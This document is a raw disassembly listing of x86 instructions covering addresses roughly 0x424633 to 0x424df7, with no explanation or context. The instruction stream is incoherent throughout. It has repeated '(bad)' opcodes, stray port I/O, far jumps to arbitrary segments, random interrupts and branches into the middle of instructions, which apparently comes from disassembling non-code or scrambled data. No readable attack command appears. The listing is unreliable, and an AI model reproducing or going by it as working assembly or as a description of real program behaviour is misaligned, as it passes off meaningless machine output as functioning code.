  424633:	add    DWORD PTR ds:0xb2bd6f8c,0x223823f4
  42463d:	std    
  42463e:	repnz mov ah,0xff
  424641:	sbb    dh,BYTE PTR [ebp+0x73]
  424644:	js     0x4245f0
  424646:	or     al,0x2c
  424648:	cmp    DWORD PTR [ebp+0x47b4eea4],0x30
  42464f:	add    eax,0xf88b02ec
  424654:	loopne 0x424610
  424656:	cwde   
  424657:	addr16 popf 
  424659:	aaa    
  42465a:	or     esi,DWORD PTR [eax-0x40]
  42465d:	push   es
  42465e:	pop    es
  42465f:	adc    eax,0x5559f633
  424664:	hlt    
  424665:	test   DWORD PTR [esi+0x5298c1c],edi
  42466b:	and    al,0x34
  42466d:	rcl    BYTE PTR [edx],0xfa
  424670:	out    dx,al
  424671:	xor    DWORD PTR [ebx+0x4a],ecx
  424674:	aam    0x34
  424676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424677:	ins    DWORD PTR es:[edi],dx
  424678:	mul    DWORD PTR [edi-0x36]
  42467b:	(bad)  
  42467c:	shr    BYTE PTR [ecx+0x9],cl
  42467f:	cmp    BYTE PTR [eax-0x45],bh
  424682:	cmp    BYTE PTR [ebp-0x5a],bl
  424685:	retf   0x475e
  424688:	inc    esp
  424689:	nop
  42468a:	push   cs
  42468b:	jp     0x424685
  42468d:	outs   dx,BYTE PTR ds:[esi]
  42468e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42468f:	out    0x91,eax
  424691:	push   edi
  424692:	lea    ebx,ds:[edi+ecx*2+0x2f3a2bb9]
  42469a:	or     DWORD PTR [esi],0x65
  42469d:	(bad)  
  42469e:	arpl   WORD PTR [ecx-0x68],si
  4246a1:	rcl    al,1
  4246a3:	call   0xb6ae:0x54b0b20a
  4246aa:	test   DWORD PTR [ebp-0x1f2801ce],0xabf2684
  4246b4:	fcomp  QWORD PTR [edx-0x16]
  4246b7:	mov    al,0x98
  4246b9:	cmp    ch,bh
  4246bb:	jecxz  0x4246d7
  4246bd:	xchg   edx,eax
  4246be:	leave  
  4246bf:	fiadd  DWORD PTR [ebx]
  4246c1:	or     esi,DWORD PTR [eax+0x7a62e313]
  4246c7:	int    0xc3
  4246c9:	scas   al,BYTE PTR es:[edi]
  4246ca:	outs   dx,DWORD PTR ds:[esi]
  4246cb:	dec    ecx
  4246cc:	jns    0x424671
  4246ce:	js     0x424744
  4246d0:	adc    ch,BYTE PTR [edi-0x12b4a0e3]
  4246d6:	aam    0x1b
  4246d8:	dec    esi
  4246d9:	adc    DWORD PTR [esi-0x6d],eax
  4246dc:	add    al,0x3
  4246de:	mov    cl,0x8a
  4246e0:	shl    BYTE PTR [edx],cl
  4246e2:	adc    BYTE PTR [edx-0x64],dh
  4246e5:	dec    ecx
  4246e6:	inc    ecx
  4246e7:	jge    0x4246ab
  4246e9:	or     al,0xc3
  4246eb:	in     eax,dx
  4246ec:	fisubr WORD PTR [ebx+eax*4-0x68c6cb0e]
  4246f3:	pop    ecx
  4246f4:	bound  eax,QWORD PTR [ebp+ebp*1+0x55]
  4246f8:	imul   ecx,DWORD PTR [edi+ebp*4-0x4a66afa9],0x3e961aac
  424703:	outs   dx,BYTE PTR ds:[esi]
  424704:	fldcw  WORD PTR [edi+0x23]
  424707:	sbb    BYTE PTR [edi-0x55],ah
  42470a:	int    0x21
  42470c:	lods   al,BYTE PTR ds:[esi]
  42470d:	xchg   DWORD PTR [edi-0x32],edi
  424710:	test   dh,0x5a
  424713:	stc    
  424714:	mov    gs,WORD PTR ss:[edi+edx*8-0x1f]
  424719:	xor    BYTE PTR [eax-0x268443de],ah
  42471f:	xor    al,0x16
  424721:	es or  al,0x2
  424724:	mov    esp,0x46ea5337
  424729:	jno    0x424744
  42472b:	mov    eax,ds:0x6ba618b9
  424730:	adc    al,BYTE PTR [eax-0x3b]
  424733:	jecxz  0x424730
  424735:	sub    al,0xa
  424737:	lahf   
  424738:	pop    es
  424739:	cmp    BYTE PTR [esi+0x22],bl
  42473c:	inc    edi
  42473d:	gs ins DWORD PTR es:[edi],dx
  42473f:	sti    
  424740:	pop    ds
  424741:	pop    ecx
  424742:	shl    BYTE PTR [ebx+ebx*2+0x37],1
  424746:	dec    ecx
  424747:	into   
  424748:	mov    dh,0x18
  42474a:	dec    ebp
  42474b:	(bad)
  42474f:	xchg   edi,eax
  424750:	jo     0x424741
  424752:	out    0x7,al
  424754:	dec    esp
  424755:	cli    
  424756:	xor    DWORD PTR [edi],0x64
  424759:	and    esi,DWORD PTR [edx+0x16]
  42475c:	std    
  42475d:	cmc    
  42475e:	inc    edx
  42475f:	inc    ebx
  424760:	jns    0x424706
  424762:	test   eax,0x695ffd8e
  424767:	xchg   ebx,eax
  424768:	mov    bl,0x5e
  42476a:	lock inc esp
  42476c:	or     eax,0x55795f1b
  424771:	jbe    0x4247c7
  424773:	push   ds
  424774:	cmp    al,0xb0
  424776:	retf   
  424777:	jno    0x424754
  424779:	dec    ebx
  42477a:	mov    edi,DWORD PTR [ebx]
  42477c:	les    edx,FWORD PTR [ebx-0x6d277090]
  424782:	adc    al,0xed
  424784:	mov    ah,0x86
  424786:	call   esp
  424788:	call   0x6957400b
  42478d:	aad    0x97
  42478f:	lods   eax,DWORD PTR ds:[esi]
  424790:	and    BYTE PTR [eax],dh
  424792:	push   edx
  424793:	retf   0x42f3
  424796:	popf   
  424797:	call   0x2c93:0xad0767a
  42479e:	aad    0x80
  4247a0:	stc    
  4247a1:	je     0x4247a8
  4247a3:	outs   dx,BYTE PTR ds:[esi]
  4247a4:	icebp  
  4247a5:	sub    BYTE PTR [ebp-0x7ec1c78f],ch
  4247ab:	inc    bx
  4247ad:	cld    
  4247ae:	fisub  DWORD PTR ds:0xbacc91ac
  4247b4:	(bad)  
  4247b5:	cld    
  4247b6:	mov    eax,0xeac16208
  4247bb:	ror    BYTE PTR [edx],1
  4247bd:	mov    esp,0x593e8eb6
  4247c2:	inc    edi
  4247c3:	ror    BYTE PTR [edx+0x5b],1
  4247c6:	aam    0xc3
  4247c8:	inc    eax
  4247c9:	arpl   WORD PTR ss:0x55fae076,ax
  4247d0:	cmp    ah,BYTE PTR [eax+0x46]
  4247d3:	loope  0x4247a4
  4247d5:	retf   
  4247d6:	int    0x3f
  4247d8:	scas   eax,DWORD PTR es:[edi]
  4247d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247da:	mov    WORD PTR [eax+0x10be5465],?
  4247e0:	push   ss
  4247e1:	sbb    al,BYTE PTR [ebp-0x6cb7e9bc]
  4247e7:	sbb    ecx,esp
  4247e9:	aad    0x3b
  4247eb:	sub    al,0xb0
  4247ed:	xchg   esp,eax
  4247ee:	push   edx
  4247ef:	push   edi
  4247f0:	jge    0x424817
  4247f2:	fidivr WORD PTR [ebp-0x72]
  4247f5:	adc    DWORD PTR fs:[ebx+0x75edb154],0x2d
  4247fd:	aam    0x80
  4247ff:	and    ecx,edx
  424801:	fstp   QWORD PTR [ebx+0x5399679]
  424807:	cmp    bl,BYTE PTR [ecx+0xa]
  42480a:	inc    edi
  42480b:	frstor [eax+0x28]
  42480e:	and    DWORD PTR ds:0xb72ae7c1,ebp
  424814:	gs inc ebp
  424816:	loopne 0x424801
  424818:	in     eax,dx
  424819:	jg     0x424804
  42481b:	cli    
  42481c:	push   esi
  42481d:	sbb    esp,ebp
  42481f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424820:	mov    al,ds:0x2ae72a3
  424825:	pop    ds
  424826:	aad    0x50
  424828:	jne    0x42485c
  42482a:	jle    0x4247e4
  42482c:	stc    
  42482d:	xchg   edi,eax
  42482e:	ins    BYTE PTR es:[edi],dx
  42482f:	or     DWORD PTR [edi+ebp*1],ebx
  424832:	cmc    
  424833:	inc    ebp
  424834:	jl     0x42480e
  424836:	push   0xffffffa8
  424838:	sbb    eax,eax
  42483a:	in     al,0x68
  42483c:	sahf   
  42483d:	adc    DWORD PTR [edi+0x4f],ebx
  424840:	push   ecx
  424841:	and    ecx,DWORD PTR [esi]
  424843:	ins    BYTE PTR es:[edi],dx
  424844:	cmc    
  424845:	(bad)  
  424846:	jmp    DWORD PTR [edx]
  424848:	test   DWORD PTR ds:0xcba66d2f,esp
  42484e:	mov    esi,0xdb5f0787
  424853:	lea    ecx,[eax+0x34]
  424856:	call   0xcb8d8c08
  42485b:	cs cld 
  42485d:	cmp    esi,DWORD PTR [ecx]
  42485f:	push   ebp
  424860:	xor    ecx,DWORD PTR [ebx+ecx*8]
  424863:	pop    edi
  424864:	push   ss
  424865:	ss push es
  424867:	pushf  
  424868:	xlat   BYTE PTR ds:[ebx]
  424869:	int3   
  42486a:	sbb    BYTE PTR ds:0x6ba53d41,dl
  424870:	pop    ss
  424871:	int    0xf3
  424873:	and    BYTE PTR [ecx-0x6c],0xae
  424877:	shr    BYTE PTR [ebp-0x36dccc22],cl
  42487d:	lds    esi,FWORD PTR [esi+0x4e5b193e]
  424883:	ja     0x42483c
  424885:	inc    esp
  424886:	push   ss
  424887:	pusha  
  424888:	push   edx
  424889:	mov    WORD PTR [ecx+0x67],cs
  42488c:	or     al,0xe1
  42488e:	sbb    eax,0x7ee34725
  424893:	pop    ds
  424894:	push   ebx
  424895:	out    dx,eax
  424896:	inc    ebx
  424897:	push   ss
  424898:	cmp    eax,0x8faf26a6
  42489d:	dec    edx
  42489e:	fcom   QWORD PTR [esi]
  4248a0:	pop    es
  4248a1:	push   0x14
  4248a3:	mov    edx,0x9fe8de3d
  4248a8:	adc    al,0x6f
  4248aa:	inc    ebp
  4248ab:	lahf   
  4248ac:	std    
  4248ad:	cdq    
  4248ae:	mov    cl,0xf9
  4248b0:	inc    esp
  4248b1:	dec    ecx
  4248b2:	cdq    
  4248b3:	rcr    DWORD PTR [eax],0x17
  4248b6:	sbb    bl,bl
  4248b8:	imul   edi,DWORD PTR [ecx+0x67],0x9430be1b
  4248bf:	les    edi,FWORD PTR [eax+0x3fd621c7]
  4248c5:	and    cl,BYTE PTR [ebp+0x5b6ceefc]
  4248cb:	push   ebp
  4248cc:	adc    BYTE PTR [ecx],ah
  4248ce:	(bad)  
  4248cf:	ffree  st(0)
  4248d1:	repnz add eax,0x5b7ebb5b
  4248d7:	xchg   DWORD PTR [eax-0x53],esp
  4248da:	mov    ah,0x27
  4248dc:	mov    dl,0x6b
  4248de:	mov    eax,0xb03c685d
  4248e3:	cs sar esi,0xb7
  4248e7:	or     eax,0x6f9ea45f
  4248ec:	adc    al,0xaf
  4248ee:	cmp    DWORD PTR [ebx*1+0x3d5a24d4],edx
  4248f5:	pop    edx
  4248f6:	pop    esp
  4248f7:	rcr    BYTE PTR [eax-0x68c65660],1
  4248fd:	mov    BYTE PTR [ecx+0x6b0cbe8c],bh
  424903:	add    DWORD PTR [edx+0x12b5e0e7],edi
  424909:	dec    edi
  42490a:	cld    
  42490b:	cmp    al,BYTE PTR [eiz*8+0x5968aa12]
  424912:	inc    ebx
  424913:	inc    esi
  424914:	mov    ebp,0xd9448243
  424919:	add    BYTE PTR [esp+ebx*8-0x1f],dh
  42491d:	(bad)  
  42491e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42491f:	and    esp,DWORD PTR [ebp+edi*1-0x1a0a699d]
  424926:	dec    eax
  424927:	jmp    0x5c9eb54
  42492c:	sub    DWORD PTR [ecx],esi
  42492e:	pop    ds
  42492f:	mov    eax,0x734951c5
  424934:	adc    ah,ah
  424936:	test   ebx,esp
  424938:	mov    ss,WORD PTR [esi]
  42493a:	imul   edx,DWORD PTR [esi+0x5298a245],0x34
  424941:	mov    ebp,0x75feea41
  424946:	js     0x424990
  424948:	gs dec ebp
  42494a:	push   edi
  42494b:	ins    BYTE PTR es:[edi],dx
  42494c:	retf   
  42494d:	in     eax,dx
  42494e:	fs (bad) 
  424950:	scas   eax,DWORD PTR es:[edi]
  424951:	gs and eax,0x57df7cab
  424957:	stos   DWORD PTR es:[edi],eax
  424958:	mov    ds:0xa5b9dc85,eax
  42495d:	inc    edx
  42495e:	repnz push edx
  424960:	das    
  424961:	dec    esi
  424962:	arpl   WORD PTR [ebp+edx*2-0x61],ax
  424966:	dec    esi
  424967:	cmp    BYTE PTR [edi-0x9],dl
  42496a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42496b:	nop
  42496c:	sub    BYTE PTR [edi-0x2a1a6a45],cl
  424972:	sub    DWORD PTR [ebx+edi*2],ebp
  424975:	cld    
  424976:	sbb    eax,esi
  424978:	add    edi,DWORD PTR [ecx]
  42497a:	inc    ebp
  42497b:	fadd   DWORD PTR [edi-0x2d]
  42497e:	lds    edx,FWORD PTR [ebx+0x63640186]
  424984:	sbb    al,0x47
  424986:	scas   al,BYTE PTR es:[edi]
  424987:	mov    DWORD PTR [ebx+0xd75ac6b],esi
  42498d:	pop    ebp
  42498e:	push   esp
  42498f:	jne    0x42499b
  424991:	or     BYTE PTR [ebp+0x50],cl
  424994:	out    0x5e,eax
  424996:	adc    ch,BYTE PTR [edx-0xb]
  424999:	xchg   edi,eax
  42499a:	adc    BYTE PTR ds:0x59dca887,bh
  4249a0:	mov    ebx,0x310614a6
  4249a5:	(bad)
  4249a8:	jp     0x424a0d
  4249aa:	into   
  4249ab:	jge    0x42498c
  4249ad:	pop    ebx
  4249ae:	mov    ch,BYTE PTR [edi+0x23ee881e]
  4249b4:	ja     0x424945
  4249b6:	mov    al,0xbd
  4249b8:	inc    esp
  4249b9:	jo     0x4249a6
  4249bb:	fwait
  4249bc:	scas   al,BYTE PTR es:[edi]
  4249bd:	sbb    al,0xdc
  4249bf:	xchg   edx,eax
  4249c0:	jmp    0x411d:0xcc4d7b52
  4249c7:	fcomp  QWORD PTR [ebx+ecx*2+0x8]
  4249cb:	mov    bl,BYTE PTR gs:[edi+0x76]
  4249cf:	ds (bad) 
  4249d1:	sti    
  4249d2:	pusha  
  4249d3:	mov    esi,0xf67b267a
  4249d8:	rcl    BYTE PTR [ecx],1
  4249da:	xor    DWORD PTR [eax],eax
  4249dc:	sub    cl,bh
  4249de:	jns    0x424a49
  4249e0:	aam    0x29
  4249e2:	mov    ecx,0x8a0d5963
  4249e7:	push   ecx
  4249e8:	in     al,dx
  4249e9:	sbb    eax,0xa2934bdb
  4249ee:	out    0x96,eax
  4249f0:	jbe    0x42499f
  4249f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249f3:	add    bl,ah
  4249f5:	and    DWORD PTR [ebx+0xcdce281],ebp
  4249fb:	mov    al,0x10
  4249fd:	mov    edi,0x1b7d8ba3
  424a02:	stc    
  424a03:	outs   dx,BYTE PTR ds:[esi]
  424a04:	mov    eax,ds:0x13dd1b80
  424a09:	push   0x59
  424a0b:	jp     0x424a0e
  424a0d:	and    esi,DWORD PTR [ebx+0x7e]
  424a10:	or     DWORD PTR [esi-0x34ab694a],edi
  424a16:	nop
  424a17:	cs repnz (bad) 
  424a1a:	pop    ss
  424a1b:	dec    eax
  424a1c:	push   ebx
  424a1d:	dec    BYTE PTR [ecx+0x22]
  424a20:	adc    ah,BYTE PTR [ebx+0x40]
  424a23:	inc    eax
  424a24:	or     BYTE PTR [eax],dh
  424a26:	fwait
  424a27:	or     dl,bh
  424a29:	mov    esi,0x156c529d
  424a2e:	ss push ebp
  424a30:	stc    
  424a31:	or     DWORD PTR [esi-0x184d31ac],ecx
  424a37:	mov    ebp,0x680074a8
  424a3c:	imul   esp,DWORD PTR [eax],0xffffff92
  424a3f:	xchg   esi,eax
  424a40:	jne    0x424a4d
  424a42:	or     ah,BYTE PTR [ebx+0x49e4d0ae]
  424a48:	mov    ebx,DWORD PTR [ebp+ecx*1-0x63]
  424a4c:	cdq    
  424a4d:	ins    DWORD PTR es:[edi],dx
  424a4e:	call   0xc29439eb
  424a53:	push   edi
  424a54:	xlat   BYTE PTR ds:[ebx]
  424a55:	imul   edi,DWORD PTR [edx],0x11d951ce
  424a5b:	es or  eax,0x79ade3ba
  424a61:	inc    ecx
  424a62:	cs xchg ebx,eax
  424a64:	aaa    
  424a65:	sub    BYTE PTR [ecx+esi*2],0x0
  424a69:	add    BYTE PTR [edx+0x41],dl
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	add    cl,BYTE PTR [ebx+eax*4]
  424a79:	cmp    eax,0x1d8a4
  424a7e:	xchg   BYTE PTR [esi],al
  424a80:	add    BYTE PTR [eax],al
  424a82:	lea    ecx,[edx]
  424a84:	into   
  424a85:	add    al,0x76
  424a87:	ins    DWORD PTR es:[edi],dx
  424a88:	fwait
  424a89:	cmc    
  424a8a:	loopne 0x424a29
  424a8c:	or     eax,0xfbd61d19
  424a91:	xor    al,0x61
  424a93:	push   edi
  424a94:	outs   dx,DWORD PTR ds:[esi]
  424a95:	ins    DWORD PTR es:[edi],dx
  424a96:	ds cmp eax,0x54d412ca
  424a9c:	jo     0x424aec
  424a9e:	and    al,0x4f
  424aa0:	adc    eax,0x81d0fbcc
  424aa5:	dec    ebx
  424aa6:	cmp    esi,DWORD PTR [edi-0x69d9fbac]
  424aac:	inc    ebp
  424aad:	and    al,0xb9
  424aaf:	inc    ecx
  424ab0:	mov    ecx,0x78a46b41
  424ab5:	mov    bh,BYTE PTR [ecx+0x7]
  424ab8:	into   
  424ab9:	pusha  
  424aba:	xor    al,0xe
  424abc:	call   0x9105:0x425857b9
  424ac3:	jnp    0x424a87
  424ac5:	push   ebp
  424ac6:	inc    esp
  424ac7:	fist   DWORD PTR [ebx-0x5e]
  424aca:	nop
  424acb:	push   es
  424acc:	inc    esi
  424acd:	cmp    BYTE PTR [ecx],bh
  424acf:	dec    ecx
  424ad0:	jle    0x424b1a
  424ad2:	lds    edx,FWORD PTR [eax+0x26]
  424ad5:	push   ebp
  424ad6:	inc    edi
  424ad7:	mov    cl,0x6e
  424ad9:	aam    0x26
  424adb:	je     0x424b36
  424add:	imul   eax,DWORD PTR [eax+0x64964e0f],0x71db948d
  424ae7:	xor    dh,BYTE PTR [esi+0x19]
  424aea:	sti    
  424aeb:	sbb    eax,0x2c17a244
  424af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424af1:	and    edi,ebx
  424af3:	xor    al,0x4
  424af5:	sub    ebx,DWORD PTR [ecx]
  424af7:	push   ebx
  424af8:	push   ebx
  424af9:	mov    esp,0xfaf94da9
  424afe:	call   0x475505e5
  424b03:	xchg   esi,eax
  424b04:	jge    0x424b09
  424b06:	ror    BYTE PTR [edi],1
  424b08:	jg     0x424b41
  424b0a:	je     0x424ac8
  424b0c:	call   DWORD PTR [edx]
  424b0e:	sub    al,BYTE PTR [edi]
  424b10:	xchg   ebx,eax
  424b11:	popf   
  424b12:	cmc    
  424b13:	aas    
  424b14:	mov    ecx,0x2cddb333
  424b19:	int    0x82
  424b1b:	in     eax,0x58
  424b1d:	and    cl,BYTE PTR [eax+0x17]
  424b20:	add    ebx,DWORD PTR [ebx+0x39edaa9c]
  424b26:	or     DWORD PTR [edi],0xa5594320
  424b2c:	xchg   esi,eax
  424b2d:	adc    bh,BYTE PTR [eax-0x2112f8ea]
  424b33:	dec    esp
  424b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b35:	sbb    BYTE PTR [edx-0x154cd987],bl
  424b3b:	cli    
  424b3c:	and    DWORD PTR es:[ecx+ebx*1+0x76655895],ebx
  424b44:	jns    0x424b84
  424b46:	icebp  
  424b47:	push   cs
  424b48:	push   0xafaf8fb
  424b4d:	jno    0x424b45
  424b4f:	rcr    DWORD PTR [esi+0x28],0xae
  424b53:	retf   0xf385
  424b56:	adc    BYTE PTR [edx-0x48f4ad58],ah
  424b5c:	fsubr  DWORD PTR [ebp-0x38]
  424b5f:	call   0xd5db33ec
  424b64:	sti    
  424b65:	(bad)  
  424b66:	js     0x424b42
  424b68:	ja     0x424b42
  424b6a:	shl    DWORD PTR [ecx+0x4419e234],1
  424b70:	mov    al,0xac
  424b72:	mov    esi,0x8bbb5911
  424b77:	mov    al,ds:0xb0655f24
  424b7c:	int3   
  424b7d:	in     al,0x60
  424b7f:	sti    
  424b80:	out    dx,eax
  424b81:	and    BYTE PTR [edx-0x7],0x64
  424b85:	dec    edi
  424b86:	dec    esp
  424b87:	dec    ecx
  424b88:	dec    ebx
  424b89:	mov    esp,0x54b5b3b2
  424b8e:	enter  0x620c,0x2d
  424b92:	push   ds
  424b93:	retf   0xaa6b
  424b96:	retf   0x9197
  424b99:	ror    DWORD PTR [ebp-0x3068a9d8],1
  424b9f:	jne    0x424b5d
  424ba1:	dec    ebp
  424ba2:	out    0xce,eax
  424ba4:	inc    eax
  424ba5:	test   eax,0xd5228847
  424baa:	repnz push edi
  424bac:	jmp    0xb98a:0x2d8476fd
  424bb3:	call   0x24df:0x2707f96b
  424bba:	rol    DWORD PTR [edx+0x46],1
  424bbd:	sbb    al,0x29
  424bbf:	xor    al,BYTE PTR [esp+ebp*1-0x201bb299]
  424bc6:	mov    dh,0x82
  424bc8:	ror    DWORD PTR [edi+ebx*2-0x6f461062],1
  424bcf:	pushf  
  424bd0:	out    dx,eax
  424bd1:	adc    BYTE PTR [eax],ah
  424bd3:	cld    
  424bd4:	push   esi
  424bd5:	outs   dx,DWORD PTR ds:[esi]
  424bd6:	push   es
  424bd7:	dec    eax
  424bd8:	mov    eax,ds:0x2735cdcd
  424bdd:	out    dx,eax
  424bde:	adc    eax,0xb8d76fb1
  424be3:	jl     0x424bee
  424be5:	push   0x2
  424be7:	ffree  st(1)
  424be9:	xlat   BYTE PTR ds:[ebx]
  424bea:	(bad)  
  424beb:	xlat   BYTE PTR ds:[ebx]
  424bec:	std    
  424bed:	mov    cs,WORD PTR [eax-0x62]
  424bf0:	mov    esi,0x7eb1162f
  424bf5:	out    0x31,eax
  424bf7:	pusha  
  424bf8:	enter  0xd8d,0x66
  424bfc:	jae    0x424bc7
  424bfe:	in     eax,0xaf
  424c00:	and    al,0x27
  424c02:	fild   DWORD PTR [eax]
  424c04:	add    al,0xb8
  424c06:	pushf  
  424c07:	fdiv   st(2),st
  424c09:	dec    eax
  424c0a:	and    ebp,DWORD PTR [esp+edx*2-0x75]
  424c0e:	sbb    ah,BYTE PTR [esi+ebx*8-0x7d]
  424c12:	repnz mov ah,0xbd
  424c15:	inc    edi
  424c16:	scas   eax,DWORD PTR es:[edi]
  424c17:	aaa    
  424c18:	sub    bl,BYTE PTR [edx]
  424c1a:	jo     0x424c28
  424c1c:	or     dh,BYTE PTR ds:0xa6795a66
  424c22:	sar    DWORD PTR [edi],cl
  424c24:	sub    al,0x80
  424c26:	(bad)  
  424c27:	sub    ebx,DWORD PTR [ebx+ecx*2+0x56d6fd57]
  424c2e:	mov    dl,0x22
  424c30:	and    DWORD PTR [eax+0xbe9ef70],ebp
  424c36:	push   ebp
  424c37:	int3   
  424c38:	mov    ah,BYTE PTR [eax-0x42]
  424c3b:	lods   eax,DWORD PTR ds:[esi]
  424c3c:	movq   QWORD PTR ds:[ecx+eiz*8-0x4a8cc077],mm2
  424c45:	fnstsw WORD PTR [ebp+0x5f5e00af]
  424c4b:	cdq    
  424c4c:	div    BYTE PTR [ebx+ebp*2]
  424c4f:	fld    st(5)
  424c51:	jmp    0x424cbf
  424c53:	gs retf 
  424c55:	and    ebx,DWORD PTR [ebx+edx*2+0x45aec53c]
  424c5c:	sub    al,0xe6
  424c5e:	jbe    0x424bf4
  424c60:	pushf  
  424c61:	int    0x5
  424c63:	and    DWORD PTR [ecx-0x26],0x121b05e1
  424c6a:	(bad)  
  424c6b:	(bad)  
  424c6d:	loop   0x424c84
  424c6f:	cli    
  424c70:	mov    al,ds:0x199288ca
  424c75:	mov    ?,edi
  424c77:	jp     0x424c4a
  424c79:	dec    ebp
  424c7a:	test   al,0xe4
  424c7c:	push   ebx
  424c7d:	mov    dl,0xcd
  424c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c80:	pusha  
  424c81:	cmp    al,0xcb
  424c83:	adc    BYTE PTR [edi+0x63b6da09],0x5e
  424c8a:	test   eax,0x191f73f0
  424c8f:	jmp    0x4769:0x2b2fd34
  424c96:	xchg   ebx,eax
  424c97:	bound  eax,QWORD PTR [esi]
  424c99:	xor    edx,edx
  424c9b:	fdivp  st(2),st
  424c9d:	mov    esi,0xcaeb78c
  424ca2:	jmp    0xaeae:0xbbebac7c
  424ca9:	dec    ecx
  424caa:	(bad)  
  424cab:	aam    0xea
  424cad:	fistp  QWORD PTR [ebx]
  424caf:	jo     0x424cc6
  424cb1:	xchg   ecx,eax
  424cb2:	xchg   BYTE PTR [eax-0x75127cce],dl
  424cb8:	inc    ebx
  424cb9:	dec    esp
  424cba:	cmp    ch,dl
  424cbc:	sbb    DWORD PTR [eax+0x25],edi
  424cbf:	and    eax,0xc29b0e2e
  424cc4:	std    
  424cc5:	imul   ecx,ecx,0xffffffcb
  424cc8:	xchg   edx,eax
  424cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cca:	lock shl DWORD PTR [edi],0x46
  424cce:	inc    esp
  424ccf:	mov    ebx,DWORD PTR [eax-0x68]
  424cd2:	scas   al,BYTE PTR es:[edi]
  424cd3:	sbb    esi,0xffffff8a
  424cd6:	outs   dx,DWORD PTR ds:[esi]
  424cd7:	and    eax,0x8665c2
  424cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cdd:	xchg   DWORD PTR [edi+0x70],esi
  424ce0:	mov    eax,ds:0x279a8aa
  424ce5:	sbb    eax,ecx
  424ce7:	sub    ch,dl
  424ce9:	and    DWORD PTR [ecx+ebx*1-0x2836c341],0xbb52933b
  424cf4:	sub    al,0x5c
  424cf6:	jg     0x424c91
  424cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cf9:	loop   0x424cfa
  424cfb:	mov    ds:0xb0932dc5,eax
  424d00:	mov    ah,0x9f
  424d02:	jae    0x424d7f
  424d04:	bound  eax,QWORD PTR [edx+0x1a]
  424d07:	push   cs
  424d08:	stos   BYTE PTR es:[edi],al
  424d09:	mov    WORD PTR [edx+0x75],cs
  424d0c:	aaa    
  424d0d:	or     cl,BYTE PTR [edi-0x5d]
  424d10:	sub    DWORD PTR [esi+0x4],ebx
  424d13:	sti    
  424d14:	fwait
  424d15:	xchg   DWORD PTR [esi+ecx*8+0x6f63ff14],ebx
  424d1c:	cwde   
  424d1d:	mov    cl,0xe8
  424d1f:	xchg   esp,eax
  424d20:	into   
  424d21:	mov    ecx,0xcb524278
  424d26:	repnz mov ebx,0x918c2c91
  424d2c:	lods   al,BYTE PTR ds:[esi]
  424d2d:	imul   ebp,DWORD PTR [ecx+edx*2+0x160a9433],0x66cd30cd
  424d38:	adc    eax,0xebe9ca57
  424d3d:	sti    
  424d3e:	sbb    ebx,DWORD PTR [ebp-0x3d6adea4]
  424d44:	retf   0x23e
  424d47:	icebp  
  424d48:	mov    BYTE PTR [esi-0x13fda137],bh
  424d4e:	push   edi
  424d4f:	and    edx,DWORD PTR [ecx+edx*2-0x6b]
  424d53:	jno    0x424d49
  424d55:	mov    al,0xca
  424d57:	call   0xe8395b41
  424d5c:	mov    ds:0x50d576f6,eax
  424d61:	and    BYTE PTR [ecx],al
  424d63:	out    dx,eax
  424d64:	mov    esi,0x4254e8d4
  424d69:	in     eax,dx
  424d6a:	lahf   
  424d6b:	inc    eax
  424d6c:	sbb    eax,DWORD PTR [edi+ecx*8-0x2d2cfdb2]
  424d73:	mov    edx,0xd071c1fd
  424d78:	push   ebp
  424d79:	cmp    DWORD PTR [esi-0xef47a87],esp
  424d7f:	int3   
  424d80:	pop    ss
  424d81:	adc    ebx,ebx
  424d83:	xor    ch,BYTE PTR [edi]
  424d85:	das    
  424d86:	inc    ebx
  424d87:	mov    ds:0x3f0dfc82,al
  424d8c:	dec    edi
  424d8d:	mov    BYTE PTR [ecx+0x32],al
  424d90:	cmp    al,0xaa
  424d92:	mov    esi,0xb6f4f58a
  424d97:	or     eax,0x7aa9c793
  424d9c:	or     bl,BYTE PTR [esp+edi*2-0xf180de9]
  424da3:	lods   al,BYTE PTR ds:[esi]
  424da4:	adc    DWORD PTR ds:0xcc9dd949,ebp
  424daa:	pop    esp
  424dab:	mov    ebx,DWORD PTR [ebx]
  424dad:	inc    eax
  424dae:	jge    0x424dd2
  424db0:	shrd   edx,edx,cl
  424db3:	mov    cl,BYTE PTR [ecx-0x46]
  424db6:	mulps  xmm2,XMMWORD PTR [edi+0x1b663392]
  424dbd:	cmp    bl,BYTE PTR [edi-0x6b]
  424dc0:	adc    al,0x14
  424dc2:	jge    0x424db4
  424dc4:	and    BYTE PTR [ebx],dl
  424dc6:	push   0xffffff98
  424dc8:	or     dh,BYTE PTR [ebx]
  424dca:	mov    cl,0x19
  424dcc:	ret    
  424dcd:	hlt    
  424dce:	jge    0x424e4e
  424dd0:	test   DWORD PTR [edi+0x49],edi
  424dd3:	xor    cl,dl
  424dd5:	jl     0x424e31
  424dd7:	inc    ecx
  424dd8:	out    dx,eax
  424dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dda:	test   al,0xf0
  424ddc:	cmp    bl,dl
  424dde:	cmp    al,0x4f
  424de0:	mov    DWORD PTR gs:[esi+0x7b],edx
  424de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424de5:	add    BYTE PTR [ebx+0x3263ef2e],0xbb
  424dec:	jmp    0x424d94
  424dee:	cmp    ebp,ecx
  424df0:	std    
  424df1:	lock xchg ebp,eax
  424df3:	add    eax,esi
  424df5:	aam    0x90
  424df7:	test   eax,0x380c6425
